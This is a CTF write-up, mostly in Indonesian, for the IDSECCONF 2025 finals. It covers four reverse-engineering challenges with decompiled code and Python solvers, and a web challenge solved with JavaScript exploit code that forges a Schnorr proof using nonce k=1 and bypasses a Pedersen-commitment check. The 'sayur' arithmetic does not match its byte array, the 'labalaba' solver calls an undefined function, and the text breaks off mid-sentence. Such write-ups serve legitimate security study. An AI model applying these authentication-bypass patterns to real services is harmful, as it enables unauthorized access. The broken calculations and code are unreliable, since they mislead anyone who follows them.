# CTF IDSECCONF 2025 Finals Writeup


{{< param description >}}

# Reverse [4/5]

## 1. peyek

### Deskripsi

{{< admonition type=info title="Click to show the desc" open=false >}}

Download filenya di bawah

{{< /admonition >}}

### Langkah Penyelesaian

{{< admonition type=tip title="TL;DR" open=true >}}
  Chall reverse sangat sederhana, yaitu **constraint-based reversing**. Cukup dekompilasi file `.pyc` yang diberikan dengan [PyLingual](https://pylingual.io/) → analisis algoritma dekripsi kunci → dapat flag.
{{< /admonition >}}

Berikut adalah hasil dekompilasinya:

`extracted.py`

```python
# filename: extracted.py

def y():
  print('Wrong flag!')
  exit(1)

def x(theflag):
  if len(theflag) != 24:
    y()
  if theflag[:5] != 'flag{':
    y()
  y() if theflag[23] != '}' else 23
  b = theflag[5:23].split('_')
  if len(b) != 3:
    y()
  if b[0][0] != 'A' or b[1][0] != 'A' or b[2][0] != 'A':
    y()
  c = b[0][1:3] + b[1][1:3]
  if c != 'kuda':
    y()
  if b[1][3:6] != 'lah' or b[2][1:4] != 'rsi' or b[2][4:7] != 'tek':
    y()
  print('Congratulations! The flag is correct.')

def entry():
  try:
    with open('flag.txt', 'r') as f:
      x(f.readline().strip())
  except FileNotFoundError:
    print('Error: file not found!')


if __name__ == '__main__':
  entry()
```

Berdasarkan fungsi `x(theflag)`, berikut adalah semua validasi yang dilakukan:

**1. Constraint Dasar:**

- Panjang flag harus **24 karakter**
- Harus dimulai dengan `flag{` (5 karakter)
- Harus diakhiri dengan `}` di index 23

**2. Struktur Bagian Tengah:**

```python
b = theflag[5:23].split('_')  # Ambil karakter index 5-22 (18 karakter)
```

- Bagian tengah harus terdiri dari **3 bagian** yang dipisahkan underscore `_` .

**3. Constraint Detail per Bagian:**

**Bagian 1 (b[0]):**

- Harus dimulai dengan `'A'` .
- `b[0][1:3]` harus = `'ku'` (dari constraint `c = 'kuda'`).

**Bagian 2 (b[1]):**

- Harus dimulai dengan `'A'`
- `b[1][1:3]` harus = `'da'` (dari constraint `c = 'kuda'`)
- `b[1][3:6]` harus = `'lah'`

**Bagian 3 (b[2]):**

- Harus dimulai dengan `'A'`
- `b[2][1:4]` harus = `'rsi'`
- `b[2][4:7]` harus = `'tek'`

**Rekonstruksi Flag:**

Mari kita susun setiap bagian:

- **b[0]** = `'A'` + `'ku'` = `'Aku'`
- **b[1]** = `'A'` + `'da'` + `'lah'` = `'Adalah'`
- **b[2]** = `'A'` + `'rsi'` + `'tek'` = `'Arsitek'`

Gabungkan dengan underscore, maka akan membentuk string yang menyerupai sebuah flag: `Aku_Adalah_Arsitek`

Panjang: 3 + 1 + 6 + 1 + 7 = **18 karakter**

**Verifikasi:**

- Panjang total: 5 + 18 + 1 = **24 karakter**
- Format: `flag{...}`
- Tiga bagian dipisah underscore
- Semua constraint terpenuhi

**Eksekusi:**

Jika flag sudah yakin benar, tinggal masukan saja ke dalam file `flag.txt` agar extracted file `.pyc` bisa dijalankan. Jika flag benar, maka akan muncul output: **`Congratulations! The flag is correct.`**

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `flag{Aku_Adalah_Arsitek}`
{{< /admonition >}}

## 2. sayur

### Deskripsi

{{< admonition type=info title="Click to show the desc" open=false >}}
  Download filenya di bawah
{{< /admonition >}}

### Langkah Penyelesaian

{{< admonition type=tip title="TL;DR" open=true >}}
  Decompile ELF binary dengan IDA → temukan key → dapatkan flag dengan cara **key + 95**.
{{< /admonition >}}

Hasil dekompilasi ELF binary menggunakan IDA:

`chall_decompiled.c`

```c
void __fastcall __noreturn start(int a1, int a2, int a3, int a4, int a5, int a6, int a7, const char *filename)
{
  __int64 v8; // rax
  __int64 v9; // rax
  int i; // ecx
  signed __int64 v11; // rax
  signed __int64 v12; // rax
  signed __int64 v13; // rax
  const char *v14; // rsi
  size_t v15; // rdx
  signed __int64 v16; // rax
  signed __int64 v17; // rax
  void *retaddr; // [rsp+0h] [rbp+0h]

  if ( retaddr != (void *)2 )
    goto LABEL_10;
  v8 = sys_open(filename, 0, a3);
  if ( v8 < 0 )
  {
    v14 = aErrorOpeningFi;
    v15 = 19;
  }
  else
  {
    *(_QWORD *)&fd = v8;
    v9 = sys_read(v8, buf, 0x1Cu);
    if ( v9 <= 0 )
    {
LABEL_9:
      v12 = sys_close(fd);
      v13 = sys_exit(0);
LABEL_10:
      v14 = (const char *)&unk_4011BD;
      v15 = 13;
      goto LABEL_13;
    }
    if ( v9 == 27 )
    {
      for ( i = 0; i < 26; ++i )
      {
        if ( *(_BYTE *)((unsigned int)buf + i) - 95 != *(_BYTE *)((unsigned int)&aErrorOpeningFi[45] + i) )
          goto LABEL_11;
      }
      v11 = sys_write(1u, buf, 0x1Bu);
      goto LABEL_9;
    }
LABEL_11:
    v14 = &aErrorOpeningFi[19];
    v15 = 26;
  }
LABEL_13:
  v16 = sys_write(2u, v14, v15);
  v17 = sys_exit(1);
}
```

**1. Validasi Argumen**

ELF binary meminta 1 argumen sebuah file untuk memvalidasi flag.

```c
if ( retaddr != (void *)2 )  // Cek argc == 2
```

**2. Proses Pembacaan File**

Variabel `v9` adalah panjang karakter flag yang akan divalidasi.

```c
sys_open(filename, 0, a3); // Buka file
sys_read(v8, buf, 0x1Cu);  // Baca 0x1C = 28 bytes
if ( v9 == 27 )            // Harus tepat 27 bytes / 27 karakter
```

3. Validasi Flag / Dekripsi Kunci

```c
for ( i = 0; i < 26; ++i )
{
  if ( buf[i] - 95 != aErrorOpeningFi[45 + i] )
    goto LABEL_11;  // Salah!
}
```

Berarti formula untuk decrypt seperti ini:

`buf[i] - 95 == aErrorOpeningFi[45 + i]`

Dan untuk mendapatkan flagnya seperti ini:

`flag[i] = aErrorOpeningFi[45 + i] + 95`

Berikut adalah inspeksi pada array `aErrorOpeningFi`:

```c
LOAD:00000000004011CA ; char aErrorOpeningFi[47]
LOAD:00000000004011CA aErrorOpeningFi db 'Error opening file',0Ah
LOAD:00000000004011CA                                         ; DATA XREF: start:loc_40018F↑o
LOAD:00000000004011DD                 db 'Oops, flagnya masih salah',0Ah
LOAD:00000000004011F7                 db 7,0Dh
LOAD:00000000004011F9                 db    2
LOAD:00000000004011FA                 db    8
LOAD:00000000004011FB                 db  1Ch
LOAD:00000000004011FC                 db  0Eh
LOAD:00000000004011FD                 db    2
LOAD:00000000004011FE                 db  0Fh
LOAD:00000000004011FF                 db    4
LOAD:0000000000401200                 db  0Ah
LOAD:0000000000401201                 db  0Fh
LOAD:0000000000401202                 db    8
LOAD:0000000000401203                 db    0
LOAD:0000000000401204                 db  0Eh
LOAD:0000000000401205                 db    2
LOAD:0000000000401206                 db  0Fh
LOAD:0000000000401207                 db  0Ah
LOAD:0000000000401208                 db    2
LOAD:0000000000401209                 db    0
LOAD:000000000040120A                 db  0Eh
LOAD:000000000040120B                 db    2
LOAD:000000000040120C                 db  0Fh
LOAD:000000000040120D                 db  15h
LOAD:000000000040120E                 db    2
LOAD:000000000040120F                 db  11h
LOAD:0000000000401210                 db  1Eh
```

Setelah dilakukan percobaan dekripsi menggunakan array `aErrorOpeningFi`, terdapat string yang menyusun flag seperti berikut:

```
flag[0] = 7 + 95 = 102 = 'f'
flag[1] = 13 + 95 = 108 = 'l'
flag[2] = 6 + 95 = 101 = 'a'
flag[3] = 12 + 95 = 107 = 'g'
flag[4] = 28 + 95 = 123 = '{'
```

Oke, langsung saja berikut adalah final solver script:

```python
# Filename: solver.py

encrypted = [
	0x07, 0x0D, 0x02, 0x08, 0x1C, 0x0E, 
	0x02, 0x0F, 0x04, 0x0A, 0x0F, 0x08, 
	0x00, 0x0E, 0x02, 0x0F, 0x0A, 0x02, 
	0x00, 0x0E, 0x02, 0x0F, 0x15, 0x02, 
	0x11, 0x1E
]

flag = []
for byte in encrypted:
	flag.append(chr(byte + 95))

print(f"Flag --> {''.join(flag)}")
```

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `flag{mancing_mania_mantap}`
{{< /admonition >}}

## 3. begini

### Deskripsi

{{< admonition type=info title="Click to show the desc" open=false >}}
  Download filenya di bawah
{{< /admonition >}}

### Langkah Penyelesaian

{{< admonition type=tip title="TL;DR" open=true >}}
  Decompile EXE file dengan IDA → ambil encrypted key → decrypt key sesuai algoritma.
{{< /admonition >}}

Berikut adalah hasil dekompilasi EXE file:

`chall_decompiled.cxx`

```cpp
void __noreturn start()
{
  unsigned int i; // [rsp+20h] [rbp-18h]
  UINT PrivateProfileIntA; // [rsp+24h] [rbp-14h]
  int v2; // [rsp+28h] [rbp-10h]

  GetModuleFileNameA(0, FileName, 0x104u);
  v2 = lstrlenA(FileName) - 4;
  lstrcpyA(&FileName[v2], String2);
  PrivateProfileIntA = GetPrivateProfileIntA(AppName, KeyName, 0, FileName);
  if ( GetLastError() )
    sub_140001000(aOopsJikaTidakH);
  if ( PrivateProfileIntA != 666 )
    sub_140001000(aOopsMasihSalah);
  for ( i = 0; i < 0x1A; ++i )
    Text[i] = -102 - dword_140002050[i];
  MessageBoxA(0, Text, aIdsecconf2025_1, 0x40u);
  ExitProcess(0);
}
```

Dari kode dekompilasi di atas, berikut adalah algoritma validasi / dekripsi key.

```c
for ( i = 0; i < 0x1A; ++i )
  Text[i] = -102 - dword_140002050[i];
```

Berikut adalah encrypted key dari array `dword_140002050` (array 26 nilai encrypted / 0x1A).

```c
.rdata:0000000140002050 dword_140002050 dd
234h, 22Eh, 239h, 233h, 21Fh, 237h, 22Bh, 226h, 22Bh
.rdata:0000000140002050                                         
.rdata:0000000140002074                 dd
23Bh, 22Fh, 22Bh, 22Ch, 228h, 22Bh, 23Bh, 22Ah, 239h

.rdata:0000000140002098                 dd
2 dup(22Eh), 225h, 238h, 239h, 227h, 239h, 21Dh
```

Karena data yang dibutuhkan sudah diperoleh, termasuk dword / key-nya. Langsung saja craft solver script dan berikut adalah full solver script:

```python
encrypted = [
	564, 558, 569, 563, 543, 567, 555, 550, 555,
	571, 559, 555, 556, 552, 555, 571, 554, 569,
	558, 558, 549, 568, 569, 551, 569, 541
]

flag = ""
for enc in encrypted:
  # Formula: -102 - enc, then wrap to 8-bit (mod 256)
  value = (-102 - enc) % 256
  flag += chr(value)

print(f"Flag --> {flag}")
```

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `flag{coto_konro_pallubasa}`
{{< /admonition >}}

## 4. labalaba

### Deskripsi

{{< admonition type=info title="Click to show the desc" open=false >}}
  Download filenya di bawah
{{< /admonition >}}

### Langkah Penyelesaian

{{< admonition type=tip title="TL;DR" open=true >}}
  Ambil symbols dari Golang ELF Binary dengan tool `GoReSym` → Jalankan plugin `goresym_rename.py` di Ghidra → Analisis fungsi `main.main` dan `main.flag` untuk mendapatkan algoritma dekripsi kunci → Dekripsi key -> Profit!.
{{< /admonition >}}

Pertama, saya coba cek file dan dekompilasi ELF binary tersebut. Ternyata file tersebut ELF binary Golang. Berikut adalah versi Golang.

```bash
strings laba-laba

# Output:
1.25.3
```

Untuk dekompilasi ELF binary Golang, kita memerlukan plugin **GoReSym** Ghidra untuk mendapatkan dekompilasi dari fungsi `main.main`. Selengkapnya bisa membaca artikel berikut ini: [https://nikkoenggaliano.my.id/read.php?id=45](https://nikkoenggaliano.my.id/read.php?id=45).

Sebelum itu, kita perlu melakukan symbol recovery pada ELF binary tersebut dengan tool `GoReSym`. Berikut adalah perintahnya:

```bash
GoReSym -t -d -p laba-laba > symbols.json
```

Load file `symbols.json` dengan plugin GoReSym di Ghidra.

Di folder `m` terdapat decompiled code `main.main` , which is itu yang kita cari-cari untuk mengetahui algoritma dekripsi key. Selain itu, ada juga `main.flag` untuk informasi tambahan yg berkaitan dengan flag.

![laba-laba_01](/images/ctf-idsecconf2025_finals_rev4-01.png)

Berikut adalah dekompilasi fungsi `main.main`:

```c
void main.main(void)

{
  undefined8 *puVar1;
  long unaff_R14;
  undefined8 in_XMM15_Qa;
  undefined8 in_XMM15_Qb;
  
  while (&stack0x00000000 <= *(undefined1 **)(unaff_R14 + 0x10)) {
    runtime.morestack_noctxt();
  }
  net/http.HandleFunc();
  puVar1 = (undefined8 *)runtime.newobject();
  puVar1[1] = 5;
  *puVar1 = 
  ":8080false<nil>Error1562578125&amp;&#34;&#39;Rangehttpsclose:pathHTTP1HTTP2%s %qHTTP/Allow%s:%d:h ttpFoundwritelstatint16int32int64uint8arrayslice and tls: EarlyparseMarchAprilmonthLocallinuxfiles imap2imap3imapspop3shostsutf-8%s*%dtext/rangedefersweeptestRtestWexecWhchanexecRschedsudogtimergsc anmheaptracepanicsleepgcing MB,  got= ...\n max=scav  ptr ] = (trap:init  ms, fault tab= tag= top= [...], fp:Realmbad nGreeksse41sse42ssse3SHA-1P-224P-256P-384P-521ECDSA (at ClassStringFormat[]byte string390625GOAWAYClosedunusedactiveclosedCANCELPADDEDCookiemethodschemeexpectstreamExpectPragma</ a>.\nLockedremovespliceuint16uint32uint64structchan<-<-chan ValueX25519%w%.0wlengthkem_idSundayMon dayFridayAugustminutesecondGOROOTAcceptServernetdnsdomaingophertelnetreturn.locallisten.onionndots :ip+netsocketacceptallow"
  ;
  puVar1[2] = in_XMM15_Qa;
  puVar1[3] = in_XMM15_Qb;
  net/http.(*Server).ListenAndServe();
  return;
}
```

Dan ini adalah dekompilasi fungsi `main.flag`:

```c
void main.flag(void)

{
  long *plVar1;
  long in_RAX;
  long lVar2;
  long lVar3;
  ulong uVar4;
  long unaff_R14;
  long lStack0000000000000008;
  char local_ab [27];
  long local_90;
  long local_88;
  long local_80;
  undefined8 *local_78;
  undefined **ppuStack_70;
  long *local_68;
  long *local_60;
  
  lStack0000000000000008 = in_RAX;
  while (&local_68 <= *(long ***)(unaff_R14 + 0x10)) {
    runtime.morestack_noctxt();
  }
  FUN_0047f60b(&local_88);
  runtime.mapIterStart();
  do {
    if (local_68 == (long *)0x0) {
      return;
    }
    if ((((local_68[1] == 0xd) && (plVar1 = (long *)*local_68, *plVar1 == 0x6e6f636365736449)) &&
        ((int)plVar1[1] == 0x32303266)) && (*(char *)((long)plVar1 + 0xc) == '5')) {
      lVar2 = *local_60;
      lVar3 = local_60[1];
      while (0 < lVar3) {
        local_90 = lVar3;
        local_80 = lVar2;
        lVar2 = strconv.Atoi();
        if (lVar2 != 99) {
          if (lStack0000000000000008 == 0) goto LAB_0061d038;
          uVar4 = (ulong)*(uint *)(lStack0000000000000008 + 0x10);
          goto LAB_0061d076;
        }
        builtin_strncpy(local_ab,
                        "&+\x1f$7/\"\x1e\x17&$\x1a\x13#\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13#" ,
                        0x1b);
        for (lVar2 = 0; lVar2 < 0x1b; lVar2 = lVar2 + 1) {
          local_ab[lVar2] = local_ab[lVar2] + (char)lVar2 + '@';
        }
        lVar2 = lStack0000000000000008;
        if (lStack0000000000000008 != 0) {
          uVar4 = (ulong)*(uint *)(lStack0000000000000008 + 0x10);
          do {
            lVar2 = (uVar4 & *(ulong *)PTR_DAT_0094bc30) * 0x10;
            if (*(long *)(PTR_DAT_0094bc30 + lVar2 + 8) == *(long *)(lStack0000000000000008 + 8)) {
              lVar2 = *(long *)(PTR_DAT_0094bc30 + lVar2 + 0x10);
              goto LAB_0061cf0e;
            }
            uVar4 = uVar4 + 1;
          } while (*(long *)(PTR_DAT_0094bc30 + lVar2 + 8) != 0);
          lVar2 = runtime.typeAssert();
        }
LAB_0061cf0e:
        local_88 = lVar2;
        runtime.slicebytetostring();
        ppuStack_70 = (undefined **)runtime.convTstring();
        local_78 = &DAT_006943c0;
        fmt.Fprintf(3,&local_78,&DAT_006943c0,&DAT_006f4b7b,1,1);
        lVar2 = local_80 + 0x10;
        lVar3 = local_90 + -1;
      }
    }
    runtime.mapIterNext();
  } while( true );
  while (uVar4 = uVar4 + 1, *(long *)(PTR_DAT_0094bc10 + lVar2 + 8) != 0) {
LAB_0061d076:
    lVar2 = (uVar4 & *(ulong *)PTR_DAT_0094bc10) * 0x10;
    if (*(long *)(PTR_DAT_0094bc10 + lVar2 + 8) == *(long *)(lStack0000000000000008 + 8)) {
      lStack0000000000000008 = *(long *)(PTR_DAT_0094bc10 + lVar2 + 0x10);
      goto LAB_0061d038;
    }
  }
  lStack0000000000000008 = runtime.typeAssert();
LAB_0061d038:
  local_78 = &DAT_006943c0;
  ppuStack_70 = &PTR_DAT_007650c0;
  fmt.Fprint(1,1,lStack0000000000000008,&local_78);
  return;
}
```

**I. Logic Validation dalam `main.flag`:**

**Condition 1: Query Parameter Check**

```c
if ((((local_68[1] == 0xd) &&      (plVar1 = (long *)*local_68, *plVar1 == 0x6e6f636365736449)) &&    ((int)plVar1[1] == 0x32303266)) &&     (*(char *)((long)plVar1 + 0xc) == '5'))`
```

**Decoding hex values:**

- `0xd` = 13 (panjang string)
- `0x6e6f636365736449` = **"Idseccon"** (little-endian)
- `0x32303266` = **"f202"**
- `'5'` = **'5'**

**Combined:** `"Idsecconf2025"` (13 chars) ✅

**Condition 2: Value Must Be 99**

```c
lVar2 = strconv.Atoi();if (lVar2 != 99) {
  // fail
}
```

Query parameter **value harus = "99"**

**II. Flag Decryption Algorithm**

**Encrypted Data:**

```c
builtin_strncpy(local_ab,    "&+\x1f$7/\"\x1e\x17&$\x1a\x13#\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13#",    0x1b);  // 27 bytes`
```

**Decryption Loop:**

```c
for (
	lVar2 = 0;
	lVar2 < 0x1b;
	lVar2 = lVar2 + 1
) {
	local_ab[lVar2] = local_ab[lVar2] + (char)lVar2 + '@';
}
```

**Formula dekripsi key:** `flag[i] = encrypted[i] + i + 64`

Karena sudah mendapatkan informasi yang cukup untuk dekripsi key, langsung saja kita craft solver script untuk mendapatkan flag. Berikut adalah final solver script yang saya buat:

```python
def decrypt_flag():
  """Decrypt flag menggunakan algoritma yang ditemukan di binary"""
  
  # Encrypted data dari binary (address: main.flag)
  encrypted = b"&+\x1f$7/\"\x1e\x17&$\x1a\x13#\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13#"
  
  # Decryption algorithm dari reverse engineering:
  # flag[i] = encrypted[i] + i + 64
  
  flag = ""
  for i in range(len(encrypted)):
    decrypted_char = encrypted[i] + i + 64  # 64 = '@' ASCII
    flag += chr(decrypted_char)
  
  return flag

def solve():
  # Decrypt flag
  flag = decrypt_flag()
  
  print("[*] Encrypted bytes found at address: 0x9A2100 (main.flag)")
  print("[*] Decryption algorithm: flag[i] = encrypted[i] + i + 64")
  print()
  
  # Show step-by-step
  encrypted = b"&+\x1f$7/\"\x1e\x17&$\x1a\x13#\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13#"
  
  print("Step-by-step decryption:")
  print("-" * 70)
  for i in range(len(encrypted)):
    enc = encrypted[i]
    dec = enc + i + 64
    char = chr(dec)
    print(f"  [{i:2d}]  0x{enc:02x} ({enc:3d}) + {i:2d} + 64 = {dec:3d} = '{char}'")
  
  print(f"Flag --> {flag}")
  
  return flag

if __name__ == "__main__":
  flag = main()
```

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `flag{the_one_piece_is_real}`
{{< /admonition >}}

---

# Web [1/4]

## nolnol

### Langkah Penyelesaian

**🔍 Initial Reconnaissance**

**Stage 0: Discovery**

Mengakses URL utama menampilkan halaman "The Protocol Gate" dengan form untuk memulai challenge. Analisis awal menunjukkan tiga tahapan:

1. **Stage 1:** Zero-Knowledge Authentication
2. **Stage 2:** Hidden Commitments  
3. **Stage 3:** Circuit Verification

**Endpoint Discovery**

Melakukan scanning endpoint untuk menemukan API yang tersedia:

```javascript
// Endpoint yang ditemukan:
/api/stage1/challenge  // POST - Mendapatkan challenge
/api/stage1/prove      // POST - Submit proof
/api/stage2/check      // POST - Check vault status
/api/stage2/reveal     // POST - Reveal hidden data
/api/stage3/circuit-info    // GET - Get circuit info
/api/stage3/submit-proof    // POST - Submit witness
```

**🎯 Stage 1: Zero-Knowledge Authentication (Schnorr Protocol)**

**Vulnerability Analysis**

Stage 1 menggunakan **Schnorr Signature Protocol** untuk authentication. Server memberikan public key dan session ID, kemudian meminta client untuk membuat valid proof tanpa mengetahui private key.

**Protocol Normal:**

```
1. Client: R = g^k (k = random nonce)
2. Server: c = H(R, m)  (challenge)
3. Client: s = k + c*x  (response, x = private key)
4. Verify: g^s = R * PK^c
```

**Exploitation**

Setelah testing berbagai format proof, ditemukan bahwa server menerima format:
```json
{
  "sessionId": "<session_id>",
  "commitment": { "x": "<x_coord>", "y": "<y_coord>" },
  "response": "<scalar>"
}
```

**Critical Vulnerability:** Server menggunakan **weak/predictable nonce k = 1**!

Ketika nonce = 1:
- Commitment R = G^1 = **Generator Point** secp256k1
- Response s = 1

Generator point secp256k1:

```
Gx = 79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798
Gy = 483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8
```

**Exploit Code**

```javascript
async function bypassStage1() {
    // Get challenge
    const session = await fetch('/api/stage1/challenge', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    }).then(r => r.json());
    
    console.log("Session ID:", session.sessionId);
    
    // Forge proof with k=1 (generator point)
    const proof = {
        sessionId: session.sessionId,
        commitment: {
            x: "79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798",
            y: "483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8"
        },
        response: "1"
    };
    
    const result = await fetch('/api/stage1/prove', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(proof)
    }).then(r => r.json());
    
    console.log("Stage 1 Token:", result.token);
    return result.token;
}
```

**Result**

```json
{
  "success": true,
  "message": "Authentication successful! The vault is unlocked...",
  "token": "6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e",
  "nextStage": "/vault"
}
```

-> **Stage 1 Token:** `6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e`

**🔓 Stage 2: Hidden Commitments (Pedersen Commitment)**

**Vulnerability Analysis**

Stage 2 menggunakan **Pedersen Commitment** untuk menyembunyikan data dalam vault. Sistem mengklaim vault kosong, namun commitment memiliki 256 bits - mencurigakan untuk data kosong.

**Pedersen Commitment Formula:**

```
C = g^m · h^r
```

Di, mana:
- `m` = message (data)
- `r` = blinding factor (seharusnya rahasia)

HTML comment memberikan hint:
```html
<!-- 
  空虚ではない (Not empty)
  Blinding factor structure: [random_bits || hidden_data]
  Analyze the commitment length. Does it match an "empty" vault?
-->
```

**Check Vault Status**

```javascript
const token = "6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e";

const checkResp = await fetch('/api/stage2/check', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token })
}).then(r => r.json());
```

**Response:**
```json
{
  "vaultStatus": "empty",
  "commitment": "6d61bd6f38b7220657a836881aa323ab09f35299ba54653a7308caf025bdfb3f",
  "message": "The vault appears to be empty... or is it?",
  "metadata": {
    "dataLength": 0,
    "checksum": "a2e4822a98337283e39f7b60acf85ec9",
    "commitmentBits": 256
  }
}
```

**Exploitation**

**Critical Vulnerability:** Server menggunakan **commitment itu sendiri sebagai blinding factor**!

Dalam implementasi Pedersen Commitment yang benar, blinding factor harus tetap rahasia dan tidak dapat di-derive dari commitment. Namun server menggunakan arsitektur yang cacat.

**Exploit Code**

```javascript
async function bypassStage2() {
    const token = "6be02341d0c08c9aa1c97faedbc6bcec52a358abb63701a5edf008570333fe1e";
    
    // Check vault first
    const checkData = await fetch('/api/stage2/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
    }).then(r => r.json());
    
    const commitment = checkData.commitment;
    console.log("Commitment:", commitment);
    
    // Use commitment as blinding factor (vulnerability!)
    const revealData = await fetch('/api/stage2/reveal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            token: token, 
            blinding: commitment  // <-- Key exploit!
        })
    }).then(r => r.json());
    
    console.log("Stage 2 Token:", revealData.token);
    return revealData.token;
}
```

**Result**

```json
{
  "success": true,
  "message": "The vault was never empty...",
  "hint": "Look deeper into the structure. Circuit verification awaits.",
  "blindingPattern": "377ff27d767d6b7c",
  "token": "e8cba586b5317e73abcfd70de15b54e97c0caf4a1f0db2ce3d61fc0e67188228",
  "nextStage": "/circuit"
}
```

-> **Stage 2 Token:** `e8cba586b5317e73abcfd70de15b54e97c0caf4a1f0db2ce3d61fc0e67188228`

**🔢 Stage 3: Circuit Verification (Arithmetic Circuit)**

**Challenge Analysis**

Stage 3 menggunakan **Arithmetic Circuit** dalam finite field untuk memverifikasi knowledge of witness.

**Circuit Info:**

```javascript
const circuitInfo = await fetch('/api/stage3/circuit-info').then(r => r.json());
```

**Response:**
```json
{
  "description": "Prove you can access the flag vault",
  "circuit": {
    "type": "quadratic_residue",
    "publicInput": "189a4b2b5aa5655683b2f7fefdfa2d04e1e17a58a27af05be5ae28416fef48a9",
    "constraint": "x * x = public_input (mod prime)",
    "prime": "fffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"
  },
  "note": "Submit a valid witness (x) that satisfies the circuit"
}
```

**Mathematical Problem**

Kita perlu menemukan `x`, di mana:
```
x² ≡ y (mod p)

Dimana:
y = 0x189a4b2b5aa5655683b2f7fefdfa2d04e1e17a58a27af05be5ae28416fef48a9
p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f (secp256k1 prime)
```

**Hint Analysis**

Server memberikan hint: **"The circuit has no range constraints. Think about alternative solutions..."**

Ini mengindikasikan potensi vulnerability, namun setelah testing berbagai bypass (negative values, large values, dll), ternyata kita tetap perlu menghitung square root yang valid.

**Solution: Computing Square Root in Finite Field**

Untuk prime secp256k1 dimana `p ≡ 3 (mod 4)`, kita dapat menggunakan formula sederhana:

```
x = y^((p+1)/4) mod p
```

**Solver Script**

```javascript
async function solveStage3() {
    const token = "e8cba586b5317e73abcfd70de15b54e97c0caf4a1f0db2ce3d61fc0e67188228";
    
    const publicInput = "189a4b2b5aa5655683b2f7fefdfa2d04e1e17a58a27af05be5ae28416fef48a9";
    const prime = "fffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f";
    
    const p = BigInt("0x" + prime);
    const y = BigInt("0x" + publicInput);
    
    console.log("=== COMPUTING SQUARE ROOT IN FINITE FIELD ===\n");
    
    // Fast modular exponentiation
    function modPow(base, exponent, modulus) {
        if (modulus === 1n) return 0n;
        let result = 1n;
        base = base % modulus;
        while (exponent > 0n) {
            if (exponent % 2n === 1n) {
                result = (result * base) % modulus;
            }
            exponent = exponent >> 1n;
            base = (base * base) % modulus;
        }
        return result;
    }
    
    // Verify p ≡ 3 (mod 4)
    const pMod4 = p % 4n;
    console.log("p mod 4 =", pMod4.toString()); // Should be 3
    
    if(pMod4 === 3n) {
        console.log("✓ Using formula: x = y^((p+1)/4) mod p\n");
        
        const exponent = (p + 1n) / 4n;
        const x = modPow(y, exponent, p);
        
        console.log("Computed x:", x.toString(16));
        
        // Verify
        const verification = (x * x) % p;
        console.log("\nVerification: x² mod p =", verification.toString(16));
        console.log("Expected:                 ", y.toString(16));
        console.log("Match:", verification === y);
        
        if(verification === y) {
            console.log("\n✓✓✓ SQUARE ROOT VERIFIED!\n");
            
            // Submit witness
            const result = await fetch('/api/stage3/submit-proof', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    token: token, 
                    witness: x.toString(16)
                })
            }).then(r => r.json());
            
            if(result.success) {
                console.log("\n🎉 CHALLENGE COMPLETED! 🎉\n");
                console.log("FLAG:", result.flag);
                console.log("\nExplanation:", result.explanation);
                return result;
            }
        }
    }
}

solveStage3();
```

**Mathematical Explanation**

**Mengapa formula ini bekerja?**

Untuk prime `p` dimana `p ≡ 3 (mod 4)`, dan `y` adalah quadratic residue:

1. Dari Fermat's Little Theorem: `y^(p-1) ≡ 1 (mod p)`
2. Maka: `y^((p-1)/2) ≡ ±1 (mod p)`
3. Untuk quadratic residue: `y^((p-1)/2) ≡ 1 (mod p)`
4. Kalikan kedua sisi dengan `y`: `y^((p+1)/2) ≡ y (mod p)`
5. Maka: `(y^((p+1)/4))² ≡ y (mod p)`
6. Jadi: `x = y^((p+1)/4)` adalah square root dari `y`

**Verification:**

```
x = y^((p+1)/4) mod p
x² = y^((p+1)/2) mod p
x² = y^((p-1)/2) · y mod p
x² = 1 · y mod p  (karena y adalah QR)
x² = y mod p  ✓
```

**Result**

```json
{
  "success": true,
  "message": "Congratulations! You've mastered all three stages!",
  "flag": "flag{k0s0ng_t4p1_1s1}",
  "explanation": "You successfully exploited weak nonce in Schnorr protocol, broken Pedersen commitment, and solved the arithmetic circuit constraint. These vulnerabilities demonstrate the importance of proper cryptographic implementation in zero-knowledge proof systems."
}
```

---

### Summary of Vulnerabilities

| Stage | Protocol | Vulnerability | Impact |
|-------|----------|---------------|--------|
| **Stage 1** | Schnorr Signature | Weak/predictable nonce (k=1) | Complete authentication bypass - attacker dapat forge valid proof tanpa private key |
| **Stage 2** | Pedersen Commitment | Commitment used as blinding factor | Blinding factor dapat di-extract, breaking hiding property dari commitment |
| **Stage 3** | Arithmetic Circuit | No range constraints (claimed) | Hint menyesatkan - sebenarnya butuh valid square root computation, tapi lack of range constraint bisa diexploit dalam implementasi lain |

### Mitigation & Lessons Learned

**Stage 1: Schnorr Protocol**

**Problem:** Deterministic/weak nonce generation  
**Solution:**
- Use cryptographically secure random number generator (CSPRNG)
- Implement RFC 6979 (deterministic k generation from private key + message hash)
- Never reuse nonces across signatures

**Stage 2: Pedersen Commitment**

**Problem:** Blinding factor derivable from commitment  
**Solution:**
